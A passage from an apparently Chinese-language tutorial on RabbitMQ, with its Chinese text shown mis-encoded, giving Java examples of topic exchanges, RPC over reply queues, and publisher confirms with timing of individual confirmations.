        channel.basicPublish(<span class="hljs-string">"topic.exchange"</span>,<span class="hljs-string">"c.word.word.word.word.b"</span>,<span class="hljs-literal">null</span>,msgC.getBytes());
        <span class="hljs-type">String</span> <span class="hljs-variable">msgD</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello topic routingKey is c.a.b"</span>;
        channel.basicPublish(<span class="hljs-string">"topic.exchange"</span>,<span class="hljs-string">"c.a.b"</span>,<span class="hljs-literal">null</span>,msgD.getBytes());
        System.out.println(<span class="hljs-string">"å‘é€æ¶ˆæ¯æˆåŠŸ"</span>);
        <span class="hljs-comment">//7. é‡Šæ”¾èµ„æº</span>
        channel.close();
        connection.close();
    }
}


AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950</span>
</code></pre>
<h3 data-id="heading-11"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>4.2 æ¶ˆè´¹è€…</h3>
<p>ä¸¤ä¸ªæ¶ˆè´¹è€…åˆ†åˆ«æ¶ˆè´¹ä¸¤ä¸ªé˜Ÿåˆ—çš„æ¶ˆæ¯ã€‚</p>
<p>æ¶ˆè´¹è€…ï¼š</p>
<ol>
<li>åˆ›å»ºè¿æ¥</li>
<li>åˆ›å»ºChannel</li>
<li>å£°æ˜ä¸€ä¸ªé˜Ÿåˆ—Queue</li>
<li>æ¶ˆè´¹æ¶ˆæ¯</li>
<li>é‡Šæ”¾èµ„æºã€‚</li>
</ol>

<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> org.example.rabbitmq.topics;

<span class="hljs-keyword">import</span> com.rabbitmq.client.*;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer1</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException {
        <span class="hljs-comment">//åˆ›å»ºè¿æ¥</span>
        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();
        connectionFactory.setHost(<span class="hljs-string">"101.43.47.137"</span>);<span class="hljs-comment">//ipåœ°å€</span>
        connectionFactory.setPort(<span class="hljs-number">5672</span>);<span class="hljs-comment">//é»˜è®¤ç«¯å£å·</span>
        connectionFactory.setUsername(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·</span>
        connectionFactory.setPassword(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·å¯†ç </span>
        connectionFactory.setVirtualHost(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//è™šæ‹Ÿä¸»æœº</span>

        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.newConnection();

        <span class="hljs-comment">//åˆ›å»ºä¿¡é“</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();
        <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—</span>
        channel.queueDeclare(<span class="hljs-string">"topic.queue1"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
        <span class="hljs-comment">//æ¶ˆè´¹æ¶ˆæ¯</span>
        <span class="hljs-type">DefaultConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConsumer</span>(channel) {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleDelivery</span><span class="hljs-params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="hljs-type">byte</span>[] body)</span> <span class="hljs-keyword">throws</span> IOException {
                System.out.println(<span class="hljs-string">"Consumer1 æ¥æ”¶åˆ°æ¶ˆæ¯: "</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(body));
            }
        };
        channel.basicConsume(<span class="hljs-string">"topic.queue1"</span>,consumer);

        <span class="hljs-comment">//é‡Šæ”¾èµ„æº</span>
<span class="hljs-comment">//        channel.close();</span>
<span class="hljs-comment">//        connection.close();</span>

    }
}


AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839</span>
</code></pre>
<p>ç»“æœï¼š<br/>
<img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/831ff25135ab4573b2e7d84ff59567c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937423&amp;x-orig-sign=KuFRoaj8CQVj%2BKuIB4p7SzSWvD0%3D" alt="&#10;" loading="lazy"/></p>
<h2 data-id="heading-12"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>äº”ã€RPCé€šä¿¡</h2>
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/11b8469614cf4ec3b53e4dde742f55ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937422&amp;x-orig-sign=ir09WnwfuxRfJkwAhjvUhvmmI08%3D" alt="&#10;" loading="lazy"/></p>
<p>RPC(Remote Procedure Call)ï¼Œå³è¿œç¨‹è¿‡ç¨‹è°ƒâ½¤ã€‚å®ƒæ˜¯â¼€ç§é€šè¿‡â½¹ç»œä»è¿œç¨‹è®¡ç®—æœºä¸Šè¯·æ±‚æœåŠ¡ï¼Œâ½½ä¸éœ€è¦äº†è§£åº•å±‚â½¹ç»œçš„æŠ€æœ¯ã€‚ç±»ä¼¼äºHttpè¿œç¨‹è°ƒâ½¤ã€‚<br/>
RabbitMQå®ç°RPCé€šä¿¡çš„è¿‡ç¨‹ï¼Œâ¼¤æ¦‚æ˜¯é€šè¿‡ä¸¤ä¸ªé˜Ÿåˆ—å®ç°â¼€ä¸ªå¯å›è°ƒçš„è¿‡ç¨‹ã€‚</p>
<p>â¼¤æ¦‚æµç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>å®¢â¼¾ç«¯å‘é€æ¶ˆæ¯åˆ°â¼€ä¸ªæŒ‡å®šçš„é˜Ÿåˆ—ï¼Œå¹¶åœ¨æ¶ˆæ¯å±æ€§ä¸­è®¾ç½® replyTo å­—æ®µï¼Œè¿™ä¸ªå­—æ®µæŒ‡å®šäº†â¼€ä¸ªå›è°ƒé˜Ÿåˆ—ï¼ŒæœåŠ¡ç«¯å¤„ç†åï¼Œä¼šæŠŠå“åº”ç»“æœå‘é€åˆ°è¿™ä¸ªé˜Ÿåˆ—ã€‚</li>
<li>æœåŠ¡ç«¯æ¥æ”¶åˆ°è¯·æ±‚åï¼Œå¤„ç†è¯·æ±‚å¹¶å‘é€å“åº”æ¶ˆæ¯åˆ°replyToæŒ‡å®šçš„å›è°ƒé˜Ÿåˆ—</li>
<li>å®¢â¼¾ç«¯åœ¨å›è°ƒé˜Ÿåˆ—ä¸Šç­‰å¾…å“åº”æ¶ˆæ¯ï¼Œâ¼€æ—¦æ”¶åˆ°å“åº”ï¼Œå®¢â¼¾ç«¯ä¼šæ£€æŸ¥æ¶ˆæ¯çš„ correlationId å±æ€§ï¼Œä»¥ç¡®ä¿å®ƒæ˜¯æ‰€æœŸæœ›çš„å“åº”ã€‚</li>
</ol>
<h3 data-id="heading-13"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>5.1Â å®¢æˆ·ç«¯</h3>
<p>å®¢æˆ·ç«¯ï¼š</p>
<ol>
<li>å£°æ˜ä¸¤ä¸ªé˜Ÿåˆ—ï¼ŒåŒ…å«å›è°ƒé˜Ÿåˆ— replyQueueNameï¼Œå£°æ˜æœ¬æ¬¡è¯·æ±‚çš„å”¯â¼€æ ‡å¿— corrId</li>
<li>å°† replyQueueName å’Œ corrId é…ç½®åˆ°è¦å‘é€çš„æ¶ˆæ¯é˜Ÿåˆ—ä¸­</li>
<li>ä½¿â½¤é˜»å¡é˜Ÿåˆ—æ¥é˜»å¡å½“å‰è¿›ç¨‹ï¼Œç›‘å¬å›è°ƒé˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯ï¼ŒæŠŠè¯·æ±‚æ”¾åˆ°é˜»å¡é˜Ÿåˆ—ä¸­</li>
<li>é˜»å¡é˜Ÿåˆ—æœ‰æ¶ˆæ¯åï¼Œä¸»çº¿ç¨‹è¢«å”¤é†’ï¼Œæ‰“å°è¿”å›å†…å®¹</li>
</ol>

<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> org.example.rabbitmq.rpc;

<span class="hljs-keyword">import</span> com.rabbitmq.client.*;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.UUID;
<span class="hljs-keyword">import</span> java.util.concurrent.ArrayBlockingQueue;
<span class="hljs-keyword">import</span> java.util.concurrent.BlockingQueue;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Client</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException, InterruptedException {
        <span class="hljs-comment">//1. åˆ›å»ºè¿æ¥</span>
        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();
        connectionFactory.setHost(<span class="hljs-string">"101.43.47.137"</span>);<span class="hljs-comment">//ipåœ°å€</span>
        connectionFactory.setPort(<span class="hljs-number">5672</span>);<span class="hljs-comment">//é»˜è®¤ç«¯å£å·</span>
        connectionFactory.setUsername(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·</span>
        connectionFactory.setPassword(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·å¯†ç </span>
        connectionFactory.setVirtualHost(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//è™šæ‹Ÿä¸»æœº</span>

        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.newConnection();
        <span class="hljs-comment">//2. åˆ›å»ºä¿¡é“</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();
        <span class="hljs-comment">//3. å£°æ˜é˜Ÿåˆ—</span>
        channel.queueDeclare(<span class="hljs-string">"rpc.request.queue"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
        channel.queueDeclare(<span class="hljs-string">"rpc.response.queue"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
        <span class="hljs-comment">//4. å‘é€æ¶ˆæ¯</span>
        <span class="hljs-comment">//è®¾ç½®è¯·æ±‚æ ‡è¯†</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">correlationId</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();
        AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder()
                .correlationId(correlationId)
                .replyTo(<span class="hljs-string">"rpc.response.queue"</span>)
                .build();

        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello rpc"</span>;
        channel.basicPublish(<span class="hljs-string">""</span>,<span class="hljs-string">"rpc.request.queue"</span>, properties,msg.getBytes());

        <span class="hljs-comment">//5. æ¥æ”¶å“åº”</span>
        <span class="hljs-comment">//ä½¿ç”¨é˜»å¡é˜Ÿåˆ—å­˜å‚¨å“åº”</span>
        <span class="hljs-keyword">final</span> BlockingQueue&lt;String&gt; response = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">1</span>);
        <span class="hljs-type">DefaultConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConsumer</span>(channel) {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleDelivery</span><span class="hljs-params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="hljs-type">byte</span>[] body)</span> <span class="hljs-keyword">throws</span> IOException {
                System.out.println(<span class="hljs-string">"Client æ¥æ”¶åˆ°æ¶ˆæ¯: "</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(body));
                <span class="hljs-comment">//åˆ¤æ–­å”¯â¼€æ ‡è¯†æ­£ç¡®, æ”¾åˆ°é˜»å¡é˜Ÿåˆ—ä¸­</span>
                <span class="hljs-keyword">if</span>(correlationId.equals(properties.getCorrelationId())) {
                    response.offer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(body));
                }
                System.out.println(<span class="hljs-string">"Client æ¥æ”¶åˆ°æ¶ˆæ¯: "</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(body));
            }
        };
        channel.basicConsume(<span class="hljs-string">"rpc.response.queue"</span>,<span class="hljs-literal">true</span>,consumer);
        <span class="hljs-comment">// è·å–å“åº”çš„ç»“æœ</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> response.take();
        System.out.println(<span class="hljs-string">" [RPC_Client] Result:"</span> + result);


    }
}


AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960</span>
</code></pre>
<h3 data-id="heading-14"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>5.2Â æœåŠ¡å™¨</h3>
<p>æœåŠ¡å™¨ï¼š</p>
<ol>
<li>æ¥æ”¶æ¶ˆæ¯</li>
<li>æ ¹æ®æ¶ˆæ¯å†…å®¹è¿›â¾å“åº”å¤„ç†ï¼ŒæŠŠåº”ç­”ç»“æœè¿”å›åˆ°å›è°ƒé˜Ÿåˆ—ä¸­</li>
</ol>

<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> org.example.rabbitmq.rpc;

<span class="hljs-keyword">import</span> com.rabbitmq.client.*;

<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeoutException;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Server</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException {
        <span class="hljs-comment">//1. åˆ›å»ºè¿æ¥</span>
        <span class="hljs-type">ConnectionFactory</span> <span class="hljs-variable">connectionFactory</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConnectionFactory</span>();
        connectionFactory.setHost(<span class="hljs-string">"101.43.47.137"</span>);<span class="hljs-comment">//ipåœ°å€</span>
        connectionFactory.setPort(<span class="hljs-number">5672</span>);<span class="hljs-comment">//é»˜è®¤ç«¯å£å·</span>
        connectionFactory.setUsername(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·</span>
        connectionFactory.setPassword(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//ç”¨æˆ·å¯†ç </span>
        connectionFactory.setVirtualHost(<span class="hljs-string">"study"</span>);<span class="hljs-comment">//è™šæ‹Ÿä¸»æœº</span>

        <span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> connectionFactory.newConnection();
        <span class="hljs-comment">//2. åˆ›å»ºä¿¡é“</span>
        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> connection.createChannel();
        <span class="hljs-comment">//æ¥æ”¶è¯·æ±‚</span>
        <span class="hljs-comment">//æ¯æ¬¡æ¥å—ä¸€æ¡</span>
        channel.basicQos(<span class="hljs-number">1</span>);
        <span class="hljs-type">DefaultConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultConsumer</span>(channel) {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleDelivery</span><span class="hljs-params">(String consumerTag, Envelope envelope, AMQP.BasicProperties properties, <span class="hljs-type">byte</span>[] body)</span> <span class="hljs-keyword">throws</span> IOException {
                System.out.println(<span class="hljs-string">"Server æ¥æ”¶åˆ°è¯·æ±‚: "</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(body));
                <span class="hljs-comment">//å“åº”è¯·æ±‚</span>
                <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">"å“åº”"</span>;
                AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">props</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder()
                        .correlationId(properties.getCorrelationId())
                        .replyTo(<span class="hljs-string">"rpc.request.queue"</span>)
                        .build();
                channel.basicPublish(<span class="hljs-string">""</span>,<span class="hljs-string">"rpc.response.queue"</span>,props,response.getBytes());
                <span class="hljs-comment">//æ‰‹åŠ¨ç¡®è®¤</span>
                channel.basicAck(envelope.getDeliveryTag(),<span class="hljs-literal">false</span>);
            }
        };
        channel.basicConsume(<span class="hljs-string">"rpc.request.queue"</span>,<span class="hljs-literal">false</span>,consumer);
    }
}


AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">123456789101112131415161718192021222324252627282930313233343536373839404142</span>
</code></pre>
<p>ç»“æœï¼š<br/>
<img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/f0b26f5968aa4e599fb53ad364cf8cd9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937422&amp;x-orig-sign=%2BPWKxlroECkVV7632EGhEuSvzJ4%3D" alt="&#10;" loading="lazy"/></p>
<h2 data-id="heading-15"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>å…­ã€Publisher Confirms(å‘å¸ƒç¡®è®¤)</h2>
<p>æ¶ˆæ¯ä¸­é—´ä»¶éƒ½ä¼šæœ‰æ¶ˆæ¯ä¸¢å¤±çš„é—®é¢˜å‘ç”Ÿï¼Œå¤§æ¦‚åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ä¸¢å¤±æƒ…å†µï¼š</p>
<ol>
<li>ç”Ÿäº§è€…é—®é¢˜ï¼šå› ä¸ºåº”ç”¨æ•…éšœï¼Œç½‘ç»œç­‰é—®é¢˜ï¼Œç”Ÿäº§è€…æ²¡æœ‰æˆåŠŸå‘æ¶ˆæ¯ä¸­é—´ä»¶å‘é€æ¶ˆæ¯ï¼›</li>
<li>æ¶ˆæ¯ä¸­é—´ä»¶é—®é¢˜ï¼šç”Ÿäº§è€…æˆåŠŸå‘é€äº†æ¶ˆæ¯ï¼Œæ¶ˆæ¯ä¸­é—´ä»¶è‡ªå·±åŸå› å¯¼è‡´æ¶ˆæ¯ä¸¢å¤±ï¼›</li>
<li>æ¶ˆè´¹è€…é—®é¢˜ï¼šæ¶ˆè´¹è€…æ¶ˆè´¹æ¶ˆæ¯æ—¶ï¼Œå¤„ç†å‡ºç°é—®é¢˜ï¼Œå¯¼è‡´æ¶ˆè´¹è€… æ¶ˆè´¹å¤±è´¥çš„ æ¶ˆæ¯ ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­åˆ é™¤äº†ã€‚</li>
</ol>
<p>RabbitMQé’ˆå¯¹ä¸Šé¢ä¸‰ç§æƒ…å†µç»™å‡ºçš„è§£å†³æ–¹æ¡ˆï¼š</p>
<ol>
<li>é’ˆå¯¹ç”Ÿäº§è€…é—®é¢˜ï¼šé‡‡å–Publisher Confirms(å‘å¸ƒç¡®è®¤)æœºåˆ¶ è§£å†³ï¼›</li>
<li>é’ˆå¯¹æ¶ˆæ¯ä¸­é—´ä»¶é—®é¢˜ï¼šé€šè¿‡æŒä¹…åŒ–æœºåˆ¶è§£å†³ï¼›</li>
<li>é’ˆå¯¹æ¶ˆè´¹è€…é—®é¢˜ï¼šé€šè¿‡æ¶ˆæ¯åº”ç­”æœºåˆ¶è§£å†³ï¼›</li>
</ol>
<p><img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/d9dad674120f4faa9958f081d48340d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937422&amp;x-orig-sign=Ll9CqHgotYIcIntGGM7tegTtrX4%3D" alt="&#10;" loading="lazy"/></p>
<p>ç”Ÿäº§è€…å°†ä¿¡é“è®¾ç½®æˆ confirm(ç¡®è®¤)æ¨¡å¼ï¼Œä¸€æ—¦ä¿¡é“è¿›å…¥ confirm æ¨¡å¼ï¼Œæ‰€æœ‰åœ¨è¯¥ä¿¡é“ä¸Šé¢å‘å¸ƒçš„æ¶ˆæ¯éƒ½ä¼šè¢«æŒ‡æ´¾ä¸€ä¸ªå”¯ä¸€çš„ID(ä»1å¼€å§‹)ï¼›<br/>
ä¸€æ—¦æ¶ˆæ¯è¢«æŠ•é€’åˆ°æ‰€æœ‰åŒ¹é…çš„é˜Ÿåˆ—ä¹‹åï¼ŒRabbitMOå°±ä¼šå‘é€ä¸€ä¸ªç¡®è®¤ç»™ç”Ÿäº§è€…ï¼ˆåŒ…å«æ¶ˆæ¯çš„å”¯ä¸€ID),è¿™å°±ä½¿å¾—ç”Ÿäº§è€…çŸ¥é“æ¶ˆæ¯å·²ç»æ­£ç¡®åˆ°è¾¾ç›®çš„é˜Ÿåˆ—äº†ï¼›<br/>
å¦‚æœæ¶ˆæ¯å’Œé˜Ÿåˆ—æ˜¯å¯æŒä¹…åŒ–çš„ï¼Œé‚£ä¹ˆç¡®è®¤æ¶ˆæ¯ä¼šåœ¨å°†æ¶ˆæ¯å†™å…¥ç£ç›˜ä¹‹åå‘å‡º.<br/>
brokerl(æ¶ˆæ¯ä¸­é—´ä»¶)å›ä¼ ç»™ç”Ÿäº§è€…çš„ç¡®è®¤æ¶ˆæ¯ä¸­ deliveryTag åŒ…å«äº†ç¡®è®¤æ¶ˆæ¯çš„åºå·ï¼Œ<br/>
æ­¤å¤– broker ä¹Ÿå¯ä»¥è®¾ç½® channel.basicAck() æ–¹æ³•ä¸­çš„ multiple å‚æ•°ï¼Œè¡¨ç¤ºåˆ°è¿™ä¸ªåºå·ä¹‹å‰çš„æ‰€æœ‰æ¶ˆæ¯éƒ½å·²ç»å¾—åˆ°äº†å¤„ç†.</p>
<h3 data-id="heading-16"><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/>6.1 Publishing Messages Individually(å•ç‹¬ç¡®è®¤)</h3>
<p>è·Ÿç”Ÿäº§è€…å‘é€æ¶ˆæ¯ï¼Œåªæœ‰è°ƒç”¨Channelç±»confirmSelect()è®¾ç½®ä¿¡é“ä¸ºconfirmæ¨¡å¼ï¼Œå’ŒChannelç±»waitForConfirmsOrDie()æ–¹æ³•ç­‰å¾…æ‰‹åŠ¨ç¡®è®¤ã€‚</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">publishingMessagesIndividually</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, TimeoutException, InterruptedException {
        <span class="hljs-keyword">try</span> (<span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> createChannel()){
            <span class="hljs-comment">//è®¾ç½®ä¿¡é“ä¸ºconfirmæ¨¡å¼</span>
            channel.confirmSelect();
            <span class="hljs-comment">//å£°æ˜é˜Ÿåˆ—</span>
            channel.queueDeclare(<span class="hljs-string">"publish.confirm.queue1"</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);
            <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
            <span class="hljs-comment">//å‘é€æ¶ˆæ¯</span>
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">200</span>; i++) {
                <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Publishing Messages Individually "</span> + i;
                channel.basicPublish(<span class="hljs-string">""</span>,<span class="hljs-string">"publish.confirm.queue1"</span>,<span class="hljs-literal">null</span>,msg.getBytes());
                <span class="hljs-comment">//ç­‰å¾…ç¡®è®¤</span>
                channel.waitForConfirmsOrDie(<span class="hljs-number">5000</span>);
            }
            <span class="hljs-type">long</span> <span class="hljs-variable">end</span> <span class="hljs-operator">=</span> System.currentTimeMillis();

            System.out.println(<span class="hljs-string">"Publishing Messages Individually(å•ç‹¬ç¡®è®¤) å‘é€200æ¡æ¶ˆæ¯è€—æ—¶ "</span>+ (end - start));
        }
    }

AIå†™ä»£ç java
è¿è¡Œ
<span class="hljs-number">12345678910111213141516171819</span>
</code></pre>
<p>ç»“æœï¼š<br/>
<img src="https://p0-xtjj-private.juejin.cn/tos-cn-i-73owjymdk6/79e080bc7cde4cc685eafd54694c9a38~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2YeawtOinow==:q75.awebp?policy=eyJ2bSI6MywidWlkIjoiMjQ0MTM0OTUxOTE0MzAzNyJ9&amp;rk3s=e9ecf3d6&amp;x-orig-authkey=f32326d3454f2ac7e96d3d06cdbb035152127018&amp;x-orig-expires=1767937423&amp;x-orig-sign=3XAc6JlUBcLZ3MJyEQLJkx3Bb9Y%3D" alt="&#10;" loading="lazy"/></p>
<p>å¯ä»¥å‘ç°ï¼Œå‘é€200æ¡æ¶ˆæ¯ï¼Œè€—æ—¶å¾ˆâ»“ã€‚</p>
<p>è§‚å¯Ÿä¸Šâ¾¯ä»£ç ï¼Œä¼šå‘ç°è¿™ç§ç­–ç•¥æ˜¯æ¯å‘é€â¼€æ¡æ¶ˆæ¯åå°±è°ƒâ½¤ channel.waitForConfirmsOrDie() â½…æ³•,ä¹‹å ç­‰å¾…æœåŠ¡ç«¯çš„ç¡®è®¤ï¼Œè¿™å®é™…ä¸Šæ˜¯â¼€ç§ä¸²â¾åŒæ­¥ç­‰å¾…çš„â½…å¼ã€‚<br/>
å°¤å…¶å¯¹äºæŒä¹…åŒ–çš„æ¶ˆæ¯æ¥è¯´ï¼Œéœ€è¦ç­‰å¾…æ¶ˆæ¯ç¡®è®¤å­˜å‚¨åœ¨ç£ç›˜ä¹‹åæ‰ä¼šè¿”å›(è°ƒâ½¤Linuxå†…æ ¸çš„fsyncâ½…æ³•)ã€‚<br/>
ä½†æ˜¯å‘å¸ƒç¡®è®¤æœºåˆ¶æ˜¯â½€æŒå¼‚æ­¥çš„ã€‚å¯ä»¥â¼€è¾¹å‘é€æ¶ˆæ¯ï¼Œâ¼€è¾¹ç­‰å¾…æ¶ˆæ¯ç¡®è®¤ã€‚</p>
